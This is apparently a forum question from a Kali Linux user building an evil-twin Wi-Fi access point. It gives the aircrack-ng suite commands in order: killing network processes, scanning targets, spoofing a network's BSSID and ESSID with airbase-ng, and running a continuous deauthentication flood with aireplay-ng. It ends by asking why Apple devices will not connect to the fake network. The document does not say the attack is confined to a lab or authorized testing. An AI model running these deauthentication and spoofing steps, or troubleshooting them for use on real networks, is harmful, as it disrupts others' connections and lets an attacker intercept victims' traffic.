<p>I am running on Kali Linux 2.0  I go into terminal and put my wireless network (wlan0) into monitor mode I kill the network manager and other processes that my interfere with this by using</p>  <pre><code>airmon-ng check kill </code></pre>  <p>Now that is done, i use  </p>  <pre><code>Airodump-ng wlan0 </code></pre>  <p>to scan for the Wifi BSSID, Chanel, and ESSID. I terminate the scan with ctrl + C. Then to make the fake/spoofed network, I use </p>  <pre><code>airbase-ng -a [MAC adress] --essid "[ESSID] -c [Chanel] wlan0 </code></pre>  <p>that process goes by and I get:</p>  <pre><code>17:26:05  Created tap interface at0 17:26:05  Trying to set MTU on at0 to 1500 17:26:05  Access Point with BSSID C8:A7:0A:BE:29:1C started. </code></pre>  <p>I then go to a new terminal window and use</p>  <pre><code>aireplay-ng -0 0 -a [MAC adress] wlan0 </code></pre>  <p>Then that terminal continuously authenticates everything that is on that network already or tries to connect to it. My issue is that I can only get computers to connect to the fake network. I was wondering why I cant get any iPhones or iPads to connect to it </p>
